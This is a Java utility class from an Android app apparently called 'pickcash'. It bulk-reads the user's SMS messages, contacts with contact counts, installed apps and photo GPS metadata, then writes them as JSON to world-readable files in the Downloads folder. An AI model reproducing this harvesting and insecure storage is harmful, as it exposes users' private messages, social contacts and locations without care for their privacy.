package com.example.pickcash.util;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.MediaStore;

import androidx.exifinterface.media.ExifInterface;

import com.example.pickcash.main.home.mgr.entity.AppInfoApply;
import com.example.pickcash.main.home.mgr.entity.ContactApply;
import com.example.pickcash.main.home.mgr.entity.ImageInfoApply;
import com.example.pickcash.main.home.mgr.entity.SmsMessageApply;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;

public class SystemUtils {
    public static File getSmsMessage(Context context) {
        final String SMS_URI_ALL = "content://sms/";

        List<SmsMessageApply> con = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Uri uri = Uri.parse(SMS_URI_ALL);
        Cursor cur = cr.query(uri, projection, null, null, "date desc");
        try {
            if (cur.moveToFirst()) {
                String name = "";
                String phoneNumber = "";
                String smsbody = "";
                long date = 0;
                int type = 1; // 1接收 2发送

                int nameColumn = cur.getColumnIndex("person"); //发送人
                int phoneNumberColumn = cur.getColumnIndex("address");  //号码
                int smsbodyColumn = cur.getColumnIndex("body");  //内容
                int dateColumn = cur.getColumnIndex("date");  //时间
                int typeColumn = cur.getColumnIndex("type");  //接收还是发送

                do {
                    name = cur.getString(nameColumn) == null ? "" : cur.getString(nameColumn);
                    phoneNumber = cur.getString(phoneNumberColumn);
                    smsbody = cur.getString(smsbodyColumn);
                    date = Long.parseLong(cur.getString(dateColumn));
                    type = cur.getInt(typeColumn);
                    con.add(new SmsMessageApply(smsbody, type, name.isEmpty() ? phoneNumber : name, phoneNumber, date));
                } while (cur.moveToNext());
            }
            String json = "[\n";
            for (int i = 0; i < con.size(); i++) {
                json += "{\n";
                json += "\"content\": \"" + con.get(i).content + "\",\n" +
                        "\"msgType\": " + con.get(i).msgType + ",\n" +
                        "\"name\": \"" + con.get(i).name + "\",\n" +
                        "\"phone\": \"" + con.get(i).phone + "\",\n" +
                        "\"time\": " + con.get(i).time + "\n";
                if (i == con.size() - 1) {
                    json += "}\n";
                } else {
                    json += "},\n";
                }
            }
            json += "]";
            String path = "sms.txt";
            return writeJsonToFile(json, path);
        } catch (Exception e) {
            HttpUtil.reportLog("getSmsMessage:" + e.toString());
        } finally {
            cur.close();
        }
        return null;
    }

    public static File getContact(Context context) {
        List<ContactApply> con = new ArrayList<>();
        Cursor cur = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null);
        try {
            if (cur.moveToFirst()) {
                int displayNameColumn = cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                int numColumnIndex = cur.getColumnIndex(ContactsContract.PhoneLookup.TIMES_CONTACTED);
                int lastContactColumnIndex = cur.getColumnIndex(ContactsContract.PhoneLookup.LAST_TIME_CONTACTED);
                int phoneColumnIndex = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int lastUpdateColumnIndex = cur.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP);
                do {
                    String disPlayName = cur.getString(displayNameColumn);// 获得联系人姓名
                    int times = Integer.parseInt(cur.getString(numColumnIndex));//获得联系次数
                    long lastContactTime = Long.parseLong(cur.getString(lastContactColumnIndex));//获得最后联系时间
                    String number = cur.getString(phoneColumnIndex);//获得手机号
                    long lastUpdateTime = Long.parseLong(cur.getString(lastUpdateColumnIndex));//获得最后更新时间

                    con.add(new ContactApply(disPlayName, times, lastUpdateTime, lastContactTime, number, lastUpdateTime));
                } while (cur.moveToNext());
            }
            String json = "[\n";
            for (int i = 0; i < con.size(); i++) {
                json += "{\n";
                json += "\"contactName\": \"" + con.get(i).contactName + "\",\n" +
                        "\"contactTimes\": " + con.get(i).contactTimes + ",\n" +
                        "\"createTime\": " + con.get(i).createTime + ",\n" +
                        "\"lastContactTime\": " + con.get(i).lastContactTime + ",\n" +
                        "\"phoneNumber\": \"" + con.get(i).phoneNumber + "\",\n" +
                        "\"updateTime\": " + con.get(i).updateTime + "\n";
                if (i == con.size() - 1) {
                    json += "}\n";
                } else {
                    json += "},\n";
                }
            }
            json += "]";
            String path = "contact.txt";
            return writeJsonToFile(json, path);
        } catch (Exception e) {
            HttpUtil.reportLog("getContact:" + e.toString());
        } finally {
            cur.close();
        }
        return null;
    }

    public static File getApp(Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            ArrayList<AppInfoApply> appInfoApplies = new ArrayList<>();

            List<PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_SERVICES |PackageManager.GET_ACTIVITIES);
            for (int i = 0; i < packages.size(); i++) {
                AppInfoApply apply = new AppInfoApply();
                PackageInfo packageInfo = packages.get(i);
                if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {//非系统
                    apply.appType = "normal";
                } else {//系统
                    apply.appType = "system";
                }
                apply.name = packageInfo.applicationInfo.loadLabel(pm).toString();
                apply.packageName = packageInfo.packageName;
                apply.versionName = packageInfo.versionName;
                apply.versionCode = "" + packageInfo.versionCode;
                apply.packagePath = packageInfo.applicationInfo.sourceDir;
                apply.installTime = packageInfo.firstInstallTime;
                apply.updateTime = packageInfo.lastUpdateTime;
                appInfoApplies.add(apply);
            }
            String json = "[\n";
            for (int i = 0; i < appInfoApplies.size(); i++) {
                json += "{\n";
                json += "\"appType\": \"" + appInfoApplies.get(i).appType + "\",\n" +
                        "\"flags\": \"" + appInfoApplies.get(i).flags + "\",\n" +
                        "\"installTime\": " + appInfoApplies.get(i).installTime + ",\n" +
                        "\"name\": \"" + appInfoApplies.get(i).name + "\",\n" +
                        "\"packageName\": \"" + appInfoApplies.get(i).packageName + "\",\n" +
                        "\"packagePath\": \"" + appInfoApplies.get(i).packagePath + "\",\n" +
                        "\"updateTime\": " + appInfoApplies.get(i).updateTime + ",\n" +
                        "\"versionCode\": \"" + appInfoApplies.get(i).versionCode + "\",\n" +
                        "\"versionName\": \"" + appInfoApplies.get(i).versionName + "\"\n";
                if (i == appInfoApplies.size() - 1) {
                    json += "}\n";
                } else {
                    json += "},\n";
                }
            }
            json += "]";
            String path = "app.txt";
            return writeJsonToFile(json, path);
        } catch (Exception e) {
            HttpUtil.reportLog("getApp:" + e.toString());
        }
        return null;
    }

    public static File getImage(Context context) {
        ArrayList<ImageInfoApply> imageInfoApplies = new ArrayList<>();
        Cursor photoCursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                null, null, null, null);
        try {
            if (photoCursor.moveToFirst()) {
                do {
                    ImageInfoApply imageInfoApply = new ImageInfoApply();
                    String photoPath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
                    BitmapFactory.Options options = new BitmapFactory.Options();
                    options.inJustDecodeBounds = true;
                    BitmapFactory.decodeFile(photoPath, options);

                    ExifInterface exifInterface = new ExifInterface(photoPath);
                    String latValue = exifInterface.getAttribute(ExifInterface.TAG_GPS_LATITUDE);
                    String latRef   = exifInterface.getAttribute(ExifInterface.TAG_GPS_LATITUDE_REF);
                    String lngValue = exifInterface.getAttribute(ExifInterface.TAG_GPS_LONGITUDE);
                    String lngRef   = exifInterface.getAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF);
                    String lat = "" + convertRationalLatLonToFloat(latValue, latRef);
                    String lng = "" + convertRationalLatLonToFloat(lngValue, lngRef);
                    imageInfoApply.author = exifInterface.getAttribute(ExifInterface.TAG_MAKE);
                    imageInfoApply.date = photoCursor.getLong(photoCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN));
                    imageInfoApply.model = exifInterface.getAttribute(ExifInterface.TAG_MODEL);
                    imageInfoApply.name = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                    imageInfoApply.width = options.outWidth;
                    imageInfoApply.height = options.outHeight;
                    imageInfoApply.latitude = lat;
                    imageInfoApply.longitude = lng;
                    imageInfoApplies.add(imageInfoApply);
                } while (photoCursor.moveToNext());
            }
            String json = "[\n";
            for (int i = 0; i < imageInfoApplies.size(); i++) {
                json += "{\n";
                json += "\"author\": \"" + imageInfoApplies.get(i).author + "\",\n" +
                        "\"date\": " + imageInfoApplies.get(i).date + ",\n" +
                        "\"width\": " + imageInfoApplies.get(i).width + ",\n" +
                        "\"height\": " + imageInfoApplies.get(i).height + ",\n" +
                        "\"latitude\": \"" + imageInfoApplies.get(i).latitude + "\",\n" +
                        "\"longitude\": \"" + imageInfoApplies.get(i).longitude + "\",\n" +
                        "\"model\": \"" + imageInfoApplies.get(i).model + "\",\n" +
                        "\"name\": \"" + imageInfoApplies.get(i).name + "\"\n";
                if (i == imageInfoApplies.size() - 1) {
                    json += "}\n";
                } else {
                    json += "},\n";
                }
            }
            json += "]";
            String path = "image.txt";
            return writeJsonToFile(json, path);
        } catch (Exception e) {
            HttpUtil.reportLog("getImage:" + e.toString());
        } finally {
            photoCursor.close();
        }
        return null;
    }

    public static File writeJsonToFile(String json, String filePath) {
        File txt = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), filePath);
        try {
            if (!txt.exists()) {
                File dir = new File(txt.getParent());
                dir.mkdirs();
                txt.createNewFile();
            }
            byte[] bytes = json.getBytes();
            FileOutputStream fos = new FileOutputStream(txt);
            fos.write(bytes);
            fos.flush();
            fos.close();
        } catch (Exception e) {
            HttpUtil.reportLog("writeJsonToFile:" + e.toString());
        }
        return txt;
    }

    private static float convertRationalLatLonToFloat(String rationalString, String ref) {
        if (rationalString == null) {
            return 0f;
        }
        try {
            String[] parts = rationalString.split(",");
            String[] pair;
            pair = parts[0].split("/");
            double degrees = Double.parseDouble(pair[0].trim()) / Double.parseDouble(pair[1].trim());
            pair = parts[1].split("/");
            double minutes = Double.parseDouble(pair[0].trim()) / Double.parseDouble(pair[1].trim());
            pair = parts[2].split("/");
            double seconds = Double.parseDouble(pair[0].trim()) / Double.parseDouble(pair[1].trim());
            double result = degrees + (minutes / 60.0) + (seconds / 3600.0);
            if (ref != null && (ref.equals("S") || ref.equals("W"))) {
                return (float) -result;
            }
            return (float) result;
        } catch (Exception e) {
            HttpUtil.reportLog("convertRationalLatLonToFloat:" + e.toString());
        }
        return 0f;
    }
}
